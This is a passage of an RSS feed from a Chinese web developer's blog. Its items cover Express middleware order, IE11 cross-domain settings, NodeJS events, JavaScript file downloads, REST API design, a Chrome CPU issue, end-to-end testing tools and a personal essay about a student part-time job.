  app.use(proxyMiddleware(context, proxyTable[context]))
})
app.use(express.json())
app.use(&amp;#39;/api&amp;#39;, (req, res, next)=&amp;gt; {

})
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;经过这个问题，我对Express中间件的挂载顺序有了更加深刻的认识。&lt;/p&gt;
&lt;p&gt;同时，在使用第三方包的过程中，如果该包bug，那么也需要自行找出合适的解决方案。而这个能力，往往就是高手与新手的区别。&lt;/p&gt;</description>
    </item>
    <item>
      <title>IE11跨域检查跨域设置</title>
      <link>https://wdd.js.org/posts/2018/08/ie-cross-domain-settings/</link>
      <pubDate>Thu, 23 Aug 2018 10:20:10 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/08/ie-cross-domain-settings/</guid>
      <description>&lt;p&gt;IE11有安全设置中有两个选项，&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跨域浏览窗口和框架&lt;/li&gt;
&lt;li&gt;通过域访问数据源&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果上面两个选项被禁用，那么IE11会拒绝跨域请求。如果想要跨域成功，必须将上面两个选项设置为启用。&lt;/p&gt;
&lt;h1 id=&#34;第一步&#34;&gt;第一步&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;打开IE11&lt;/li&gt;
&lt;li&gt;点击浏览器右上角的齿轮图标&lt;/li&gt;
&lt;li&gt;点击弹框上的 &lt;code&gt;Internet选项&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180823102310_20uJ5k_Jietu20180823-102245.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;第二步&#34;&gt;第二步&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;点击&lt;code&gt;安全&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;点击&lt;code&gt;Internet&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;点击&lt;code&gt;自定义级别&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180823103244_USZZfQ_Jietu20180823-103223.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;第三步&#34;&gt;第三步&lt;/h1&gt;
&lt;p&gt;找到&lt;code&gt;跨域浏览窗口和框架&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果这项是禁用的，那么要勾选启用。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180823103506_t5pugZ_Jietu20180823-103456.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到&lt;code&gt;通过域访问数据源&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果这项是禁用的，那么要勾选启用。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180823103835_hDBxJg_Jietu20180823-103813.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后在点击确定。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180823104124_nVXlJh_Jietu20180823-104111.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后，如果&lt;code&gt;跨域浏览窗口和框架&lt;/code&gt;,&lt;code&gt;通过域访问数据源&lt;/code&gt;都启用了，还是无法跨域。那么最好重启一下电脑。有些设置可能在重启后才会生效。&lt;/p&gt;</description>
    </item>
    <item>
      <title>毕业后，青春像一艘船，沉入海底</title>
      <link>https://wdd.js.org/posts/2018/08/the-rest-of-your-life/</link>
      <pubDate>Tue, 14 Aug 2018 18:36:40 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/08/the-rest-of-your-life/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180814211237_9Y8uPX_Jietu20180814-211226.jpeg&#34;&gt;&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;h1 id=&#34;大三那年的暑假&#34;&gt;大三那年的暑假&lt;/h1&gt;
&lt;p&gt;大三那年暑假，很多同学都回去了，寝室大楼空空如也。&lt;/p&gt;
&lt;p&gt;留在上海的同学都在各自找着兼职的工作，为了不显得无聊，我也在网上随便发了一些简历，试试看运气。&lt;/p&gt;
&lt;p&gt;写简历最难写的部分就是写你自己的长处是什么？搜索枯肠，觉得自己似乎也没什特长。感觉大学三年学到一些东西，又感觉什么都没学到。&lt;/p&gt;
&lt;p&gt;如果没有特长，总该也有点理想吧，比如想干点什么？ 似乎我也没什么想做的事情。&lt;/p&gt;
&lt;p&gt;小时候我们都有理想，慢慢长大后，理想越来越模糊，变得越来越迷茫。&lt;/p&gt;
&lt;p&gt;大学里，大部分的人都是在打游戏。我也曾迷恋过打游戏，但是因为自己比较菜，总是被虐，所以放弃了。&lt;/p&gt;
&lt;p&gt;但是我也不是那种天天对着笔记本看电视剧的人。&lt;/p&gt;
&lt;h1 id=&#34;回忆初三那年的暑假&#34;&gt;回忆初三那年的暑假&lt;/h1&gt;
&lt;p&gt;记得，初三的暑假，我参加了一个学校看展的一个免费的计算机培训班。因为培训的老师说，培训结束前会有一个测试，成绩最好的会有几百块的奖励。&lt;/p&gt;
&lt;p&gt;为了几百块的奖励，我第一个背诵完五笔拆字法。随后老师教了我们PS, 就是photoshop。当时我的理解就是，ps可以做出很多搞笑的图片。&lt;/p&gt;
&lt;p&gt;为了成为一个有能力做出搞笑图片的人。我在高中和大学期间，断断续续的系统的自学了PS。&lt;/p&gt;
&lt;p&gt;下面给展示几张我的PS照片&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180814185855_oORpt1_Jietu20180814-185838.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;【毕业照】&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180814190245_gfE8Fb_Jietu20180814-190136.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;【帮别人做的艺术照】&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180814190255_wMF7u1_Jietu20180814-190227.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;【刺客信条 换脸 我自己】&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180814190305_8V2gKz_Jietu20180814-190236.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;【旅游照 换脸 我自己】&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180814190409_GjfFso_Jietu20180814-190359.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;【宿舍楼 上面ps了一条狼】&lt;/p&gt;
&lt;h1 id=&#34;古玩艺术电商中的店小二&#34;&gt;古玩艺术电商中的店小二&lt;/h1&gt;
&lt;p&gt;基本上，我的PS技术还是能够找点兼职做的。没过多久，我收到了面试邀请，面试的公司位于一个古玩收藏品市场中。&lt;/p&gt;
&lt;p&gt;当然我面试成功了，开出的日薪也是非常诱人，&lt;code&gt;每天35元&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;在上海，35元一天的工资，除去来回上下班做地铁和公交，还有中午饭的费用外，基本上不会剩下什么，有时候稍微午饭丰盛点，自己就要倒贴。但是这也是一次不错的尝试，至少有史以来，除去父母以外，我用能力问别人要钱了。&lt;/p&gt;
&lt;p&gt;35元的日薪持续很短一段时间，然后我就涨薪了，到达每天100元。在这个做兼职的地方，我最高拿到的日薪是200元。&lt;/p&gt;
&lt;p&gt;兼职期间我做了各式各样的工作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;古玩艺术品摄影&lt;/li&gt;
&lt;li&gt;海报制作&lt;/li&gt;
&lt;li&gt;拍卖图册制作&lt;/li&gt;
&lt;li&gt;linux运维&lt;/li&gt;
&lt;li&gt;APP UI 设计&lt;/li&gt;
&lt;li&gt;网页设计&lt;/li&gt;
&lt;li&gt;python爬虫&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;兼职的日志过得很苦，单是还算充实。虽然工资不高，但是因为还没毕业，也没有奢望过高的工资。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180814211015_JTfR37_Jietu20180814-211003.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;【上图 我在一个古玩店的拍摄玉器的时候，有个小女孩过来找我玩，我随手拍的】&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180814211237_9Y8uPX_Jietu20180814-211226.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;【上图 是在1号线 莲花路地铁站 因为错过了地铁拍的】&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180814211409_tv0CQF_Jietu20180814-211402.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;【上图 是从1号线 莲花地铁站 转公交拍的】&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180814211546_tQTFxw_Jietu20180814-211535.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;【每天早上起的很早，能够看到军训的学生在操场上奔跑】&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180814211730_1b2O72_Jietu20180814-211722.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;【在古玩店一般都要拍到很晚，因为是按张数算拍照工资，拍的越多，工资越高。还好晚上回公司 打车费用是可以报销的】&lt;/p&gt;</description>
    </item>
    <item>
      <title>NodeJS Events 模块笔记</title>
      <link>https://wdd.js.org/posts/2018/08/deepin-nodejs-events/</link>
      <pubDate>Fri, 10 Aug 2018 10:18:57 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/08/deepin-nodejs-events/</guid>
      <description>&lt;h1 id=&#34;1-环境&#34;&gt;1. 环境&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;node 8.11.3&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-基本使用&#34;&gt;2. 基本使用&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 01.js

const EventEmitter = require(&amp;#39;events&amp;#39;);

class MyEmitter extends EventEmitter {}

const myEmitter = new MyEmitter();
myEmitter.on(&amp;#39;event&amp;#39;, () =&amp;gt; {
  console.log(&amp;#39;an event occurred!&amp;#39;);
});
myEmitter.emit(&amp;#39;event&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;an event occurred!
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-传参与this指向&#34;&gt;3. 传参与this指向&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;emit()&lt;/code&gt;方法可以传不限制数量的参数。&lt;/li&gt;
&lt;li&gt;除了箭头函数外，在回调函数内部，this会被绑定到EventEmitter类的实例上&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 02.js
const EventEmitter = require(&amp;#39;events&amp;#39;)

class MyEmitter extends EventEmitter {}

const myEmitter = new MyEmitter()

myEmitter.on(&amp;#39;event&amp;#39;, function (a, b){
  console.log(a, b, this, this === myEmitter)
})

myEmitter.on(&amp;#39;event&amp;#39;, (a, b) =&amp;gt; {
  console.log(a, b, this, this === myEmitter)
})

myEmitter.emit(&amp;#39;event&amp;#39;, &amp;#39;a&amp;#39;, {name:&amp;#39;wdd&amp;#39;})
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出：&lt;/p&gt;</description>
    </item>
    <item>
      <title>JavaScript动态下载文件</title>
      <link>https://wdd.js.org/posts/2018/06/js-download-file/</link>
      <pubDate>Wed, 27 Jun 2018 09:09:01 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/06/js-download-file/</guid>
      <description>&lt;h1 id=&#34;需求描述&#34;&gt;需求描述&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;可以把字符串下载成txt文件&lt;/li&gt;
&lt;li&gt;可以把对象序列化后下载json文件&lt;/li&gt;
&lt;li&gt;下载由ajax请求返回的Excel, Word, pdf 等等其他文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;基本思想&#34;&gt;基本思想&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;downloadJsonIVR () {
  var data = {name: &amp;#39;age&amp;#39;}
  data = JSON.stringify(data)
  data = new Blob([data])
  var a = document.createElement(&amp;#39;a&amp;#39;)
  var url = window.URL.createObjectURL(data)
  a.href = url
  a.download = &amp;#39;what-you-want.json&amp;#39;
  a.click()
},
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;从字符串下载文件&#34;&gt;从字符串下载文件&lt;/h1&gt;
&lt;h1 id=&#34;从ajax请求中下载文件&#34;&gt;从ajax请求中下载文件&lt;/h1&gt;</description>
    </item>
    <item>
      <title>Restful API 架构思考</title>
      <link>https://wdd.js.org/posts/2018/06/think-about-restful-api/</link>
      <pubDate>Thu, 07 Jun 2018 22:35:08 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/06/think-about-restful-api/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#1-%E4%BB%80%E4%B9%88%E6%98%AFrest&#34;&gt;1. 什么是REST?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#2-rest-api%E6%9C%80%E4%B8%BA%E9%87%8D%E8%A6%81%E7%9A%84%E7%BA%A6%E6%9D%9F&#34;&gt;2. REST API最为重要的约束&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#3-rest-api-http%E6%96%B9%E6%B3%95-%E4%B8%8E-curd&#34;&gt;3. REST API HTTP方法 与 CURD&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#4-%E7%8A%B6%E6%80%81%E7%A0%81&#34;&gt;4. 状态码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#5-restful%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1&#34;&gt;5. RESTful架构设计&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#6-%E6%96%87%E6%A1%A3&#34;&gt;6. 文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#7-%E7%89%88%E6%9C%AC&#34;&gt;7. 版本&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#8-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E7%8A%B6%E6%80%81%E4%B8%8E%E6%97%A0%E7%8A%B6%E6%80%81&#34;&gt;8. 深入理解状态与无状态&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#9-%E5%8F%82%E8%80%83&#34;&gt;9. 参考&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;1-什么是rest&#34;&gt;1. 什么是REST?&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;表现层状态转换（REST，英文：Representational State Transfer）是Roy Thomas Fielding博士于2000年在他的博士论文[1] 中提出来的一种万维网软件架构风格，目的是便于不同软件/程序在网络（例如互联网）中互相传递信息。表现层状态转换（REST，英文：Representational State Transfer）是根基于超文本传输协议(HTTP)之上而确定的一组约束和属性，是一种设计提供万维网络服务的软件构建风格。匹配或兼容于这种架构风格(简称为 REST 或 RESTful)的网络服务，允许客户端发出以统一资源标识符访问和操作网络资源的请求，而与预先定义好的无状态操作集一致化。&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E8%A1%A8%E7%8E%B0%E5%B1%82%E7%8A%B6%E6%80%81%E8%BD%AC%E6%8D%A2&#34;&gt;wikipdeia&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180607224524_M1yRtD_content_api_for_restful_web_services.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;REST API 不是一个标准或者一个是协议，仅仅是一种风格，一种style。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;RESTful API的简单定义可以轻松解释这个概念。 REST是一种架构风格，RESTful是它的解释。也就是说，如果您的后端服务器具有REST API，并且您（从网站/应用程序）向客户端请求此API，则您的客户端为RESTful。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180607225013_Kuay0l_content_rest_api_design.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-rest-api最为重要的约束&#34;&gt;2. REST API最为重要的约束&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Client-Server&lt;/code&gt; 通信只能由客户端单方面发起，表现为请求-响应的形式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Stateless&lt;/code&gt; 通信的会话状态（Session State）应该全部由客户端负责维护&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Cache&lt;/code&gt; 响应内容可以在通信链的某处被缓存，以改善网络效率&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Uniform Interface&lt;/code&gt; 通信链的组件之间通过统一的接口相互通信，以提高交互的可见性&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Layered System&lt;/code&gt; 通过限制组件的行为（即每个组件只能“看到”与其交互的紧邻层），将架构分解为若干等级的层。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Code-On-Demand&lt;/code&gt; 支持通过下载并执行一些代码（例如Java Applet、Flash或JavaScript），对客户端的功能进行扩展。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-rest-api-http方法-与-curd&#34;&gt;3. REST API HTTP方法 与 CURD&lt;/h1&gt;
&lt;p&gt;REST API 使用POST，GET, PUT, DELETE的HTTP方法来描述对资源的增、查、改、删。
这四个HTTP方法在数据层对应着SQL的插入、查询、更新、删除操作。&lt;/p&gt;</description>
    </item>
    <item>
      <title>记一次如何解决谷歌浏览器占用过高cpu问题过程</title>
      <link>https://wdd.js.org/posts/2018/06/how-to-fix-google-chrome-very-high-cpu-cost/</link>
      <pubDate>Mon, 04 Jun 2018 17:58:24 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/06/how-to-fix-google-chrome-very-high-cpu-cost/</guid>
      <description>&lt;h1 id=&#34;1-问题现象&#34;&gt;1. 问题现象&lt;/h1&gt;
&lt;p&gt;有时候发现mac风扇响的厉害，于是我检查了mac系统的活动监视器，发现Google Chrome Helper占用99%的CPU。&lt;/p&gt;
&lt;p&gt;通常来说Chrome如果占用过高的内存，这并不是什么问题，毕竟Chrome的性能以及易用性是建立在占用很多内存的基础上的。&lt;code&gt;但是无论什么程序，持续的占用超过80%的cpu，都是极不正常的&lt;/code&gt;。大多数程序都是占用维持在低于10%的CPU。&lt;/p&gt;
&lt;p&gt;活动监视器指出问题出现在Chrome浏览器。那么问题可以再次细分为三块。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Chrome系统自身问题&lt;/li&gt;
&lt;li&gt;一些插件，例如flash插件，扩展插件&lt;/li&gt;
&lt;li&gt;网页程序js出现的问题&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;2-从任务管理器着手&#34;&gt;2. 从任务管理器着手&lt;/h1&gt;
&lt;p&gt;其实Chrome浏览器自身也是有任务管理器的，一般来说windows版chrome按住&lt;code&gt;shift+esc&lt;/code&gt;就会调出任务管理器窗口。mac版调出任务管理器没有快捷，只能通过&lt;code&gt;Window &amp;gt; Task Manager&lt;/code&gt;调出。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180604181340_ymCT2T_Jietu20180604-174820.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;调出任务管理器后，发现一个标签页，CPU占用率达到99%， 那就说明，应该是这个标签页中存在持续占用大量CPU计算的程序。&lt;/p&gt;
&lt;p&gt;最后找到这个页面，发现该页面背景图是一种动态粒子图。就是基于&lt;a href=&#34;https://github.com/VincentGarreau/particles.js/&#34;&gt;particles.js&lt;/a&gt;做的。我想，终于找到你了。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180604181757_rRfc8L_687474703a2f2f76696e63656e74676172726561752e636f6d2f7061727469636c65732e6a732f6173736574732f696d672f6769746875622d73637265656e2e6a7067.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;于是我把这个动态图的相关js代码给注释掉，电脑的风扇也终于变得安静了。&lt;/p&gt;
&lt;h1 id=&#34;3-问题总结&#34;&gt;3. 问题总结&lt;/h1&gt;
&lt;p&gt;问题解决的总结：&lt;code&gt;解决问题的方法时很简单的，基于一个现象，找到一个原因，基于这个原因再找到一个现象，然后一步一步缩小问题范围，逼近最终原因。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;机器CPU过高，一般都是可以从任务管理器着手解决。系统的任务管理器可以监控各个程序占用的CPU是否正常，通常程序自身也是有任务管理的。&lt;/p&gt;
&lt;p&gt;像谷歌浏览器这种软件，几乎本身就是一个操作系统，所以说它的任务管理器也是必不可少的。Chrome浏览器再带的任务管理器可以告诉你几个关键信息。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;任务占用的&lt;code&gt;内存&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;任务占用的&lt;code&gt;CPU&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;任务占用的&lt;code&gt;网络流量&lt;/code&gt;大小&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你一打开谷歌浏览器，你的电脑风扇就拼命转，那你最好打开谷歌浏览器的任务管理器看看。&lt;/p&gt;
&lt;h1 id=&#34;4-关于动态背景图的思考&#34;&gt;4. 关于动态背景图的思考&lt;/h1&gt;
&lt;p&gt;动态背景图往往都会给人很酷炫的感觉，但是这种背景图的制作并不是很复杂，如果你使用&lt;a href=&#34;https://github.com/VincentGarreau/particles.js/&#34;&gt;particles.js&lt;/a&gt;来制作，制作一些动态背景图只需要几行代码就可以搞定。但是这种酷炫的背后，CPU也在承受着压力。&lt;/p&gt;
&lt;p&gt;particles.js提供的demo效果图，在Chrome中CPU会被提高到100%。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180605133536_WgqoKS_Jietu20180605-132714.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;也有几家使用动态背景图的官网。我记得知乎以前就用过动态背景图，但是现在找不到了。另外一个使用动态背景图的是&lt;a href=&#34;http://www.daocloud.io/&#34;&gt;daocloud&lt;/a&gt;, CPU也是会在首页飙升到50%。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180605133717_ckASzG_Jietu20180605-132903.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;所谓：&lt;code&gt;强招必自损&lt;/code&gt;，动态背景图在给人以炫酷科技感的同时，也需要权衡这种技术对客户计算机的压力。&lt;/p&gt;
&lt;p&gt;另外，&lt;code&gt;不要小看JavaScript, 它也可能引起大问题&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>IE浏览器不支持location.origin</title>
      <link>https://wdd.js.org/posts/2018/05/ie-not-support-location-origin/</link>
      <pubDate>Thu, 24 May 2018 14:50:49 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/05/ie-not-support-location-origin/</guid>
      <description>&lt;p&gt;某些IE浏览器location.origin属性是undefined，所以如果你要使用该属性，那么要注意做个能力检测。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if (!window.location.origin) {
  window.location.origin = window.location.protocol + &amp;#34;//&amp;#34; + window.location.hostname + (window.location.port ? &amp;#39;:&amp;#39; + window.location.port: &amp;#39;&amp;#39;);
}i
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>端到端测试哪家强？不容错过的Cypress</title>
      <link>https://wdd.js.org/posts/2018/05/e2e-testing-hacker-news-with-cypress/</link>
      <pubDate>Mon, 14 May 2018 10:43:02 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/05/e2e-testing-hacker-news-with-cypress/</guid>
      <description>&lt;h1 id=&#34;1-目前e2e测试工具有哪些&#34;&gt;1. 目前E2E测试工具有哪些？&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;项目&lt;/th&gt;
          &lt;th&gt;Web&lt;/th&gt;
          &lt;th&gt;Star&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/GoogleChrome/puppeteer&#34;&gt;puppeteer&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Chromium (~170Mb Mac, ~282Mb Linux, ~280Mb Win)&lt;/td&gt;
          &lt;td&gt;31906&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/segmentio/nightmare&#34;&gt;nightmare&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Electron&lt;/td&gt;
          &lt;td&gt;15502&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/nightwatchjs/nightwatch&#34;&gt;nightwatch&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;WebDriver&lt;/td&gt;
          &lt;td&gt;8135&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/angular/protractor&#34;&gt;protractor&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;selenium&lt;/td&gt;
          &lt;td&gt;7532&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/casperjs/casperjs&#34;&gt;casperjs&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;PhantomJS&lt;/td&gt;
          &lt;td&gt;7180&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/cypress-io/cypress&#34;&gt;cypress&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Electron&lt;/td&gt;
          &lt;td&gt;5303&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/assaf/zombie&#34;&gt;Zombie&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;不需要&lt;/td&gt;
          &lt;td&gt;4880&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/DevExpress/testcafe&#34;&gt;testcafe&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;不需要&lt;/td&gt;
          &lt;td&gt;4645&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/Codeception/CodeceptJS&#34;&gt;CodeceptJS&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;webdriverio&lt;/td&gt;
          &lt;td&gt;1665&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;端到端测试一般都需要一个Web容器，来运行前端应用。例如Chromium, Electron, PhantomJS, WebDriver等等。&lt;/p&gt;
&lt;p&gt;从体积角度考虑，这些Web容器&lt;code&gt;体积一般都很大&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;从速度的角度考虑：&lt;code&gt;PhantomJS, WebDriver &amp;lt; Electon, Chromium&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;而且每个工具的侧重点也不同，建议按照需要去选择。&lt;/p&gt;
&lt;h1 id=&#34;2-优秀的端到端测试工具应该有哪些特点&#34;&gt;2. 优秀的端到端测试工具应该有哪些特点？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;安装简易：我希望它非常容易安装，最好可以一行命令就可以安装完毕&lt;/li&gt;
&lt;li&gt;依赖较少：我只想做个E2E测试，不想安装jdk, python之类的东西&lt;/li&gt;
&lt;li&gt;速度很快：运行测试用例的速度要快&lt;/li&gt;
&lt;li&gt;报错详细：详细的报错&lt;/li&gt;
&lt;li&gt;API完备：鼠标键盘操作接口，DOM查询接口等&lt;/li&gt;
&lt;li&gt;Debug方便：出错了可以很方便的调试，而不是去猜&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-为什么要用cypress&#34;&gt;3. 为什么要用Cypress？&lt;/h1&gt;
&lt;p&gt;Cypress基本上拥有了上面的特点之外，还有以下特点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;时光穿梭&lt;/code&gt; 测试运行时，Cypress会自动截图，你可以轻易的查看每个时间的截图&lt;/li&gt;
